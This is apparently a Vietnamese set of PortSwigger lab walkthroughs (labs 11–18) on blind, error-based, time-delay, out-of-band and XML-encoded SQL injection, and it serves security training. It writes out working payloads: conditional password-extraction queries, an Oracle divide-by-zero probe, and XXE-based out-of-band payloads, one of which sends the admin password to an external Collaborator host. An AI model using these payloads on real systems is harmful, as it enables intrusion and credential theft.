# [Lab 11: Blind SQLi with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

![Yêu cầu lab 11](../image/lab11/0.png)

> - **Mô tả lab:** Lab chứa lỗi SQLi. sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn không được trả về và không có thông báo lỗi nào được hiển thị. Tuy nhiên, có thông báo `Welcome back` nếu truy vấn trả về kết quả.
>
> - **Database:** bảng `users` chứa 2 cột `username` và `password`. Khai thác `blind SQLi` tìm password của `administrator`.
>
> - **Mục tiêu:** đăng nhập thành công với tài khoản admin.

trang web chính

![main web](../image/lab11/01.png)

khi thực hiện filter, ta thấy có message `Welcome back!`

![query true](../image/lab11/02.png)

test các tham số thì ta thấy khi thêm `'` ở `trackingId` thì message `Welcome back!` biến mất rồi

![thêm '](../image/lab11/03.png)

khi thêm `--` thì message đã trở lại → SQLi ở trackingId và khi query của ta đúng sẽ có message `Welcome back!` còn khi sai thì không

Vì có kết quả trả về kiểu True/False nên đây là một cuộc tấn công Blind SQLi, do đó ta sẽ sử dụng các payload điều kiện trả về True/False

check bảng `users`

![Alt text](../image/lab11/04.png)

message xuất hiện → có username là `administrator` từ bảng `users`

![xác nhận có administrator](../image/lab11/05.png)

trước hết phải đoán độ dài của password đã để tiết kiệm thời gian do ta phải dò từng ký tự trong mật khẩu

`' AND (SELECT LENGTH(password)=1 FROM users WHERE username='administrator')--`

![length pass](../image/lab11/06.png)

vậy là password có 20 ký tự, tìm từng ký tự thôi

`' AND (SELECT SUBSTR(password,1,1)='a' FROM users WHERE username='administrator')--`

![Alt text](../image/lab11/07.png)

login and solve the lab

![solve](../image/lab11/08.png)

# [Lab 12: Blind SQLi with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

![Yêu cầu lab 12](../image/lab12/0.png)

> - **Mô tả lab:** Lab chứa lỗi SQLi, sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn không được trả về và ứng dụng không phản hồi theo bất kỳ cách nào khác nhau dựa trên việc truy vấn có trả về bất kỳ hàng nào hay không. Nếu truy vấn SQL gây ra lỗi thì ứng dụng sẽ trả về thông báo lỗi tùy chỉnh.
>
> - **Database:** bảng `users` chứa 2 cột `username` và `password`. Khai thác `blind SQLi` tìm password của `administrator`.
>
> - **Mục tiêu:** đăng nhập thành công với tài khoản admin.

Đây là trang web chính của bài lab, ta dễ thấy có các chức năng

- `Filter:` lọc các kết quả của tìm kiếm search

- `View details:` xem chi tiết sản phẩm

- `My account:` login và profile của account đăng nhập

![Main web](../image/lab12/01.png)

test các tham số thì khi thêm `'` ở `trackingId` thì hiển thị thông báo lỗi `500 Error`

![Alt text](../image/lab12/02.png)

Tuy nhiên khi thêm `'` thì lại duyệt web bình thường

![Alt text](../image/lab12/03.png)

Tiếp theo cần xác định xem web sử dụng database nào

![Alt text](../image/lab12/04.png)

![Alt text](../image/lab12/05.png)

phải có `FROM` → duyệt web bình thường → Database: Oracle

`' || (SELECT '' FROM users WHERE ROWNUM = 1) ||'`

- truy vấn không lỗi nên tồn tại bảng `users`

- `WHERE ROWNUM=1` tránh truy vấn trả về nhiều hàng để nối xâu được thực hiện

![Alt text](../image/lab12/06.png)

`' || (SELECT username FROM users WHERE ROWNUM = 1) ||'`

- truy vấn không lỗi nên tồn tại `username` và `password`

![Alt text](../image/lab12/07.png)

![Alt text](../image/lab12/08.png)

cũng duyệt bình thường nên xác định có username `administrator`

![Alt text](../image/lab12/09.png)

→ Response thông qua lỗi → Blind SQLi → còn có thể sử dụng payload: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`

- để các điều kiện đúng trả về kết quả sai (biểu thức chia cho 0 sẽ gây ra lỗi) để có thế giới hạn Request giúp tìm kiếm nhanh hơn

![Alt text](../image/lab12/10.png)

- các điểu kiện sai sẽ duyệt web bình thường

![Alt text](../image/lab12/11.png)

giờ tìm password thôi, trước hết dò xem có bao nhiêu ký tự đã, sử dụng Intruder test → pass 20 ký tự

![Alt text](../image/lab12/12.png)

giờ phải dò từng ký tự

![Alt text](../image/lab12/13.png)

login and solve lab

![Alt text](../image/lab12/14.png)

# [Lab 13: Visible error-based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

![Yêu cầu lab 13](../image/lab13/0.png)

> - **Mô tả lab:** Lỗi SQLi, sử dụng `tracking` cookie để truy vấn SQL, kết quả của truy vấn không được trả về.
>
> - **Database:** table `users` có 2 cột `username` và `password`.
>
> - **Mục tiêu:** tìm cách lấy password của `administrator` và đăng nhập.

main web

![main](../image/lab13/01.png)

test các tham số khi thêm `'` vào `trackingId` thì có thông báo lỗi

![thêm '](../image/lab13/02.png)

tuy nhiên khi thêm `--` thì duyệt web bình thường rồi

![thêm --](../image/lab13/03.png)

Qua thông báo ta thấy Query là `SELECT * FROM tracking WHERE id='...'`, ta chèn SQLi vào câu lệnh `SELECT` và đang truy vấn với điều kiện nên ta sẽ chèn các điều kiện vào để khai thác.

Test điều kiện đúng thì duyệt web thành công rồi

![Alt text](../image/lab13/05.png)

Test thành một câu lệnh sai thì lại tiếp tục thông báo lỗi, qua thông báo lỗi thì ra thấy phần được `SELECT` sẽ hiển thị trong lỗi

![số=chuỗi](../image/lab13/06.png)

giờ ta check bảng `users` thì lại có thông báo lỗi và qua đây ta thấy là tồn tại bảng `users` và chỉ hiển thị kết quả trên 1 dòng.

![Alt text](../image/lab13/07.png)

sử dụng `LIMIT 1` để hiển thị 1 dòng thì ta thấy đã bị giới hạn ký tự

![Bị giới hạn ký tự](../image/lab13/08.png)

bỏ bớt ký tự và truy vấn `username` thì kết quả `SELECT` ở dòng đầu là `administrator` luôn, quá tuyệt.

![Username](../image/lab13/09.png)

vậy thì `LIMIT 1` tiếp với password thì kết quả trong lỗi sẽ chính là password của `administrator`

![Password](../image/lab13/10.png)

có tài khoản và mật khẩu rồi, login và solve

![one row return](../image/lab13/11.png)

# [Lab 14: Blind SQLi with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

![Yêu cầu lab 14](../image/lab14/0.png)

> - **Mô tả lab:** lỗi SQLi, sử dụng tracking cookie thực hiện truy vấn SQL, kết quả truy vấn đều không được trả về hay gây ra lỗi, tuy nhiên có thể kích hoạt thời gian trễ.
>
> - **Mục tiêu:** khai thác và gây ra trễ 10s.

tìm payload kích hoạt time delays

![Alt text](../image/lab14/02.png)

solve the lab

![Alt text](../image/lab14/03.png)

# [Lab 15: Blind SQLi with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

![Yêu cầu lab 15](../image/lab15/0.png)

> - **Mô tả lab:** lỗi SQLi, sử dụng tracking cookie thực hiện truy vấn SQL, kết quả truy vấn đều không được trả về hay gây ra lỗi, tuy nhiên có thể kích hoạt thời gian trễ.
>
> - **Database:** table `users` có 2 cột `username` và `password`.
>
> - **Mục tiêu:** tìm cách lấy password của `administrator` và đăng nhập.

main web

![main](../image/lab15/01.png)

tìm payload kích hoạt time delays thành công

![Alt text](../image/lab15/02.png)

ngoài ra ta sẽ sử dụng các điều kiện và dùng `CASE WHEN` để lọc, các điều kiện đúng sẽ kích hoạt thời gian trễ

vẫn là dùng Intruder để test, ta cần mở thêm column `Response time` để quan sát payload có thời gian dài nhất (do thời gian phản hồi bị trễ) đó chính là payload mà ta cần

![Alt text](../image/lab15/03.png)

![Alt text](../image/lab15/04.png)

![Alt text](../image/lab15/05.png)

payload 20 có thời gian phản hồi lâu nhất, vậy là pass 20 ký tự, tiếp theo ta cần tìm từng ký tự bằng cách test lần lượt

![Alt text](../image/lab15/06.png)

![Alt text](../image/lab15/07.png)

check tiếp các ký tự còn lại sẽ ra password

ngoài ra, ta có thể test ngay 2 position

![Alt text](../image/lab15/08.png)

![Alt text](../image/lab15/09.png)

→ pass `h6gm0gaxrw9fg3jafejz`

![Alt text](../image/lab15/10.png)

# [Lab 16: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

![Yêu cầu lab 16](../image/lab16/0.png)

> **Mô tả lab:**
> - lỗi Blind SQLi, sử dụng cookie `trackingId` và truy vấn SQL. Truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, bạn có thể kích hoạt các tương tác OOB.
>
> **Mục tiêu:**
> - khai thác để thực hiện tra cứu DNS cho Burp Collaborator.

Trang web chính

![main web](../image/lab16/01.png)

Cookie chứa `trackingId`

![Alt text](../image/lab16/02.png)

Trước hết tạo 1 Burp Colaborator 

![Alt text](../image/lab16/03.png)

tìm payload để thực hiện OOB: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`

![Alt text](../image/lab16/04.png)

Kích hoạt DNS thành công

![Alt text](../image/lab16/05.png)

solve lab

![Alt text](../image/lab16/06.png)

# [Lab 17: Blind SQL injection with out-of-band data exfiltration]()

![Yêu cầu lab 17](../image/lab17/0.png)

> **Mô tả lab:**
> - lỗi Blind SQLi, sử dụng cookie `trackingId` và truy vấn SQL. Truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến response. Tuy nhiên, bạn có thể kích hoạt các tương tác OOB.
>
> - bảng `users` chứa 2 cột `username` & `password` và user `administrator`
>
> **Mục tiêu:** Khai thác tìm password và đăng nhập với tài khoản `administrator`. 

![main web](../image/lab17/01.png)

cookie chứa `trackingID`

![Alt text](../image/lab17/02.png)

Trước hết tạo 1 Burp Colaborator 

![Alt text](../image/lab16/03.png)

tạo payload: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.o6vf7kbn23qsvdgsi6ewhuzjya41stgi.oastify.com/"> %remote;]>'),'/l') FROM dual--`

![Alt text](../image/lab17/03.png)

kích hoạt thành công và thấy password rồi

![Alt text](../image/lab17/04.png)

login and solve lab

![Alt text](../image/lab17/05.png)

# [Lab 18: SQLi with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

![Yêu cầu lab 18](../image/lab18/0.png)

> **Mô tả lab:**
> - Lỗi SQL Injection ở tính năng Check stock.
>
> - Kết quả từ request sẽ được trả về trong response → sử dụng `UNION attacks` để truy xuất dữ liệu từ bảng khác.
> 
> - bảng `users` chứa thông tin username và password của người dùng.
>
> **Mục tiêu:** đăng nhập với tài khoản của `administrator`

main web

![main web](../image/lab18/01.png)

lỗi SQLi ở function `Check stock`

![check stock](../image/lab18/02.png)

Request gửi đi chứa 1 đoạn XML tìm đến productId và storeId để check

![Alt text](../image/lab18/03.png)

sửa `storeId` thành 1 phép tính coi sao, vẫn nhận được dữ liệu đúng với `storeId=2` là store `Paris` → đầu vào không được kiểm soát

![Alt text](../image/lab18/04.png)

thực hiện tấn công SQLi thì bị phát hiện

![Alt text](../image/lab18/05.png)

tiến hành bypass bằng `base64-encode` thì thấy lại duyệt bình thường

![Alt text](../image/lab18/06.png)

ta thấy có kết quả trả về rõ ràng, thực hiện `UNION attacks`

- trước hết cần xác định số cột

![Alt text](../image/lab18/07.png)

→ có 1 cột

- thực hiện `UNION attacks` để tìm tên bảng thì lại phát hiện tấn công

![Alt text](../image/lab18/08.png)

→ tiếp tục tìm cách encode, base64-encode không ok → đổi sang `HTML-encode` thì ra rồi

![Alt text](../image/lab18/09.png)

- tìm được bảng `users` rồi, ta tiếp tục tìm tên các cột

![Alt text](../image/lab18/10.png)

do chỉ có 1 cột nên ta không thể thực hiện `UNION attacks` để SELECT 2 cột cùng lúc được, có thể tìm username trước rồi tìm password, tuy nhiên dùng nối xâu luôn cho nhanh

![Alt text](../image/lab18/11.png)

tìm thấy password rồi, login và solve lab

![Alt text](../image/lab18/12.png)
